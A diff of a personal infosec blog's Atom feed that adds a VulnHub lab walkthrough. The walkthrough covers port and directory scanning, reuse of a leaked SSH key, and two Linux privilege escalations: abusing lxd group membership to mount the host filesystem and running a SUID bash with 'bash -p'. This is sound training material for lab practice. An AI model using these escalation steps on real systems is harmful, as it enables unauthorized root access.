@@ -1,4 +1,138 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-07-18T22:38:23+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">r3dw0lf_sec</title><subtitle>Official r3dw0lfsec blog. Follow this blog for awesome Infosec Articles</subtitle><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><entry><title type="html">Sauna Machine Walkthrough</title><link href="http://localhost:4000/blogs/hackthebox/sauna.html" rel="alternate" type="text/html" title="Sauna Machine Walkthrough" /><published>2020-07-18T00:00:00+05:30</published><updated>2020-07-18T00:00:00+05:30</updated><id>http://localhost:4000/blogs/hackthebox/sauna</id><content type="html" xml:base="http://localhost:4000/blogs/hackthebox/sauna.html">&lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;&lt;em&gt;“Technology is just a tool. In terms of getting the kids working together and motivating them, the teacher is the most important.”&lt;/em&gt;&lt;/strong&gt;   - Bill Gates&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-08-05T13:46:31+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">r3dw0lf_sec</title><subtitle>Official r3dw0lfsec blog. Follow this blog for awesome Infosec Articles</subtitle><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><entry><title type="html">InfoSec Prep OSCP - Vuln Hub Machine</title><link href="http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP.html" rel="alternate" type="text/html" title="InfoSec Prep OSCP - Vuln Hub Machine" /><published>2020-08-05T00:00:00+05:30</published><updated>2020-08-05T00:00:00+05:30</updated><id>http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP</id><content type="html" xml:base="http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP.html">&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#machine-summary&quot; id=&quot;markdown-toc-machine-summary&quot;&gt;Machine Summary&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#nmap-scan&quot; id=&quot;markdown-toc-nmap-scan&quot;&gt;Nmap Scan&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#enumeration-on-port-80&quot; id=&quot;markdown-toc-enumeration-on-port-80&quot;&gt;Enumeration on Port 80&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#acquiring-user-shell&quot; id=&quot;markdown-toc-acquiring-user-shell&quot;&gt;Acquiring User Shell&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege Escalation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#privilege-escalation-through-exploiting-lxd-group&quot; id=&quot;markdown-toc-privilege-escalation-through-exploiting-lxd-group&quot;&gt;Privilege Escalation through Exploiting lxd group&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#exploiting-the-misconfigured-suid---bash&quot; id=&quot;markdown-toc-exploiting-the-misconfigured-suid---bash&quot;&gt;Exploiting the misconfigured SUID - bash&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;machine-summary&quot;&gt;Machine Summary&lt;/h2&gt;
+&lt;p&gt;Machine has a web application running, upon enumerating the directories /secret.txt contains a SSH Private key which is encoded in base64. After decryption, we can login as user &lt;strong&gt;oscp&lt;/strong&gt; with the SSH Private key. we can esclate the privileges to root in two ways 1. Exploiting the lxd group 2. Exploiting the SUID - Bash&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-scan&quot;&gt;Nmap Scan&lt;/h2&gt;
+&lt;p&gt;As the golden rule i started with nmap scan&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 192.168.0.101
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/1.png&quot; alt=&quot;&quot; /&gt;
+It has two ports open&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Port&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Service&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;ssh&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;http&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;33060&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;mysqlx&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;enumeration-on-port-80&quot;&gt;Enumeration on Port 80&lt;/h2&gt;
+
+&lt;p&gt;I started to enumerate on the site, it was a wordpress site so i ran a wpscan on it but nothing poped up. I manually enumerated on the site but i ended up with no usefull information for enumeration
+&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I ran gobuster on the site to enumerate the files and directories&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.0.101/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php,html,txt,conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;secret.txt seems to be interesting, I opened it on the browser&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;acquiring-user-shell&quot;&gt;Acquiring User Shell&lt;/h2&gt;
+&lt;p&gt;It was encoded on base64 so i decoded it, viewing that it was a SSH private key&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Base64_Hash&quot;&lt;/span&gt; |base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; id_rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We need some usernames to login through ssh using the private key so i tried guessing username and username &lt;strong&gt;&lt;em&gt;oscp&lt;/em&gt;&lt;/strong&gt; worked.
+We also need to add permissions to the private key&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I logged in onto the machine using the private key for the user oscp&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa oscp@192.168.0.101
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;I enumerated the machine with current privilege as oscp, found two things that could grant us root shell&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;User is part of lxd group&lt;/li&gt;
+  &lt;li&gt;Suid was configured for /usr/bin/bash&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;By these two ways, we can proceed to root.&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation-through-exploiting-lxd-group&quot;&gt;Privilege Escalation through Exploiting lxd group&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;LXC&lt;/strong&gt; —short for “Linux containers”, is a solution for virtualizing software at the operating system level within the Linux kernel.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;LXD&lt;/strong&gt; is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the  local lxd group.
+ie. a low privilege user can create a bridge between sockets on the host and its containers. when bridging from an existing socket on the host to a new socket in a container, it makes the connection with the credentials of the LXD service. so when user speaks to the container, the messages (command) and it lands on the container with root privileges (commands are executed with the root)&lt;/p&gt;
+
+&lt;p&gt;Executing lxc directly didn’t work so i tried executing it with the full path of the binary file ie. /snap/bin/lxc&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;First i created a storage pool&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxd init
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I moved on with the default settings, now we need to create a container called test&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxc init ubuntu:18.04 &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; security.privileged&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We configure that container such that all the files and folders of the host is copied or present in /mnt/root directory&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxc config device add &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;whatever disk &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/ &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/mnt/root &lt;span class=&quot;nv&quot;&gt;recursive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now we need to start the container called test&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxc start &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We execute the container&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxc exec test bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now we go into the directory &lt;strong&gt;/mnt/root/root&lt;/strong&gt; to get the flag.txt&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p class=&quot;note&quot; title=&quot;Attention&quot;&gt;&lt;strong&gt;This exploit methodolgy will only work when the target machine has access to internet&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;exploiting-the-misconfigured-suid---bash&quot;&gt;Exploiting the misconfigured SUID - bash&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;SUID&lt;/strong&gt; - SUID is nothing but a special permission bit available in Linux, that achieves this with a lot of ease. If you are the owner of an executable file, with the help of SUID permission set, other users will be running the executable with your  permission and not theirs.&lt;/p&gt;
+
+&lt;p&gt;We can list the binaries with SUID permissions using the command below&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/9.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bash was the juicy binary. we can exploit it to get the root privilege&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gtfobins.github.io/#+suid&quot;&gt;&lt;strong&gt;GetFoBins&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This granted us the shell with root privilege&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Happy Hacking !&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="VulnHub" /></entry><entry><title type="html">Sauna Machine Walkthrough</title><link href="http://localhost:4000/blogs/hackthebox/sauna.html" rel="alternate" type="text/html" title="Sauna Machine Walkthrough" /><published>2020-07-18T00:00:00+05:30</published><updated>2020-07-18T00:00:00+05:30</updated><id>http://localhost:4000/blogs/hackthebox/sauna</id><content type="html" xml:base="http://localhost:4000/blogs/hackthebox/sauna.html">&lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;&lt;em&gt;“Technology is just a tool. In terms of getting the kids working together and motivating them, the teacher is the most important.”&lt;/em&gt;&lt;/strong&gt;   - Bill Gates&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/poster.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
